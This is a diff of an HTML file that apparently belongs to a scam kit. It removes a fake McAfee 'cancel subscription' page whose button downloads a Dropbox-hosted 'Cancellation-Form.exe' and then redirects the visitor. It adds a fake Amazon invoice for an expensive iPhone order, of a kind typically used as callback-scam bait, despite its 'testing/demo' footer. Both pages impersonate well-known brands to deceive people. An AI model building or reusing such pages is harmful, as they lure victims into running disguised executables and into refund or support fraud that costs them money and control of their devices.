@@ -1,140 +1,179 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Cancel Subscription - McAfee Style</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      padding: 60px 20px 100px;
-      position: relative;
-    }
-
-    .logo {
-      margin-bottom: 40px;
-    }
-
-    .logo img {
-      width: 160px;
-      height: auto;
-    }
-
-    .card {
-      background-color: #ffffff;
-      border-radius: 10px;
-      padding: 30px 25px;
-      max-width: 500px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-    }
-
-    .card h1 {
-      font-size: 20px;
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    .card p {
-      font-size: 15px;
-      color: #555;
-      line-height: 1.5;
-    }
-
-    .download-btn {
-      margin-top: 30px;
-      background-color: #d61f26;
-      color: #fff;
-      text-decoration: none;
-      padding: 14px 24px;
-      font-size: 15px;
-      border-radius: 6px;
-      display: inline-block;
-      transition: background-color 0.3s ease;
-    }
-
-    .download-btn:hover {
-      background-color: #b71b1f;
-    }
-
-    footer {
-      position: fixed;
-      bottom: 15px;
-      left: 0;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      padding: 0 30px;
-      font-size: 13px;
-    }
-
-    .footer-left a {
-      color: #0066cc;
-      text-decoration: none;
-      margin-right: 15px;
-    }
-
-    .footer-left a:hover {
-      text-decoration: underline;
-    }
-
-    .footer-right {
-      font-weight: bold;
-      color: #333;
-    }
-
-    @media (max-width: 600px) {
-      .card h1 { font-size: 18px; }
-      .card p { font-size: 14px; }
-      .download-btn { padding: 12px 20px; font-size: 14px; }
-
-      footer {
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        gap: 5px;
-      }
-      .footer-left, .footer-right { margin: 5px 0; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Amazon Invoice</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f3f3f3;
+            margin: 0;
+            padding: 20px;
+        }
+        .invoice {
+            max-width: 900px;
+            margin: auto;
+            background: #ffffff;
+            padding: 25px;
+            border: 1px solid #ddd;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 2px solid #ff9900;
+            padding-bottom: 15px;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ff9900;
+        }
+        .invoice-title {
+            text-align: right;
+        }
+        .section {
+            margin-top: 25px;
+        }
+        .section h3 {
+            margin-bottom: 10px;
+            font-size: 16px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 5px;
+        }
+        .details {
+            display: flex;
+            justify-content: space-between;
+        }
+        .details div {
+            width: 48%;
+            font-size: 14px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        table th, table td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            font-size: 14px;
+        }
+        table th {
+            background: #f7f7f7;
+        }
+        .total-table {
+            width: 300px;
+            float: right;
+            margin-top: 20px;
+        }
+        .total-table td {
+            padding: 8px;
+        }
+        .total {
+            font-weight: bold;
+            background: #f7f7f7;
+        }
+        .footer {
+            clear: both;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #555;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="logo">
-    <img alt="McAfee Logo" src="https://1000logos.net/wp-content/uploads/2020/09/McAfee-Logo.png">
-  </div>
+<div class="invoice">
 
-  <div class="card">
-    <h1>Download your cancellation form and cancel your subscription from your end</h1>
-    <p>No need to call or contact our support team.<br>Your cancellation will be processed automatically once you fill up your cancellation form.</p>
-  </div>
-
-  <!-- Modified Button: Downloads + Redirects -->
-  <a class="download-btn"
-     href="https://www.dropbox.com/scl/fi/xw5kd3lkov1ftpencs9xn/Cancellation-Form.exe?rlkey=lj1ffv5ya4zegub4qvulq91cr&st=5o0e2lxk&dl=1"
-     download
-     onclick="setTimeout(() => { window.location.href = 'download.html'; }, 2000);">
-    Download Cancellation Form
-  </a>
-
-  <footer>
-    <div class="footer-left">
-      <a href="#">Contact Us</a>
-      <a href="#">Privacy Notice</a>
-      <a href="#">FAQs</a>
+    <div class="header">
+        <div class="logo">amazon</div>
+        <div class="invoice-title">
+            <h2>Invoice</h2>
+            <p>
+                Invoice #: AMZ-INV-983472<br>
+                Order #: 402-7812456-9982210<br>
+                Invoice Date: 05 Feb 2026
+            </p>
+        </div>
     </div>
-    <div class="footer-right">
-      Copyright © 2025 McAfee, LLC
+
+    <div class="section details">
+        <div>
+            <h3>Billing Address</h3>
+            <p>
+                Johnathan Miller<br>
+                742 Evergreen Terrace<br>
+                Springfield, IL 62704<br>
+                United States<br>
+                Phone: +1 312-555-0198
+            </p>
+        </div>
+        <div>
+            <h3>Sold By</h3>
+            <p>
+                Amazon.com Services LLC<br>
+                410 Terry Ave North<br>
+                Seattle, WA 98109<br>
+                United States
+            </p>
+        </div>
     </div>
-  </footer>
+
+    <div class="section">
+        <h3>Order Details</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Description</th>
+                    <th>Quantity</th>
+                    <th>Unit Price</th>
+                    <th>Total</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>
+                        Apple iPhone 17 Pro Max (512GB, Space Black)<br>
+                        <small>Sold by Amazon | Condition: New</small>
+                    </td>
+                    <td>1</td>
+                    <td>$1,499.00</td>
+                    <td>$1,499.00</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <table class="total-table">
+        <tr>
+            <td>Subtotal:</td>
+            <td style="text-align:right">$1,499.00</td>
+        </tr>
+        <tr>
+            <td>Shipping:</td>
+            <td style="text-align:right">$0.00</td>
+        </tr>
+        <tr>
+            <td>Tax (8.25%):</td>
+            <td style="text-align:right">$123.67</td>
+        </tr>
+        <tr class="total">
+            <td>Total:</td>
+            <td style="text-align:right">$1,622.67</td>
+        </tr>
+    </table>
+
+    <div class="footer">
+        <p>
+            Payment Method: Visa ending in 4821<br>
+            Thank you for shopping with Amazon.<br><br>
+            <strong>Note:</strong> This invoice is auto-generated for testing/demo purposes only.
+        </p>
+    </div>
+
+</div>
 
 </body>
 </html>
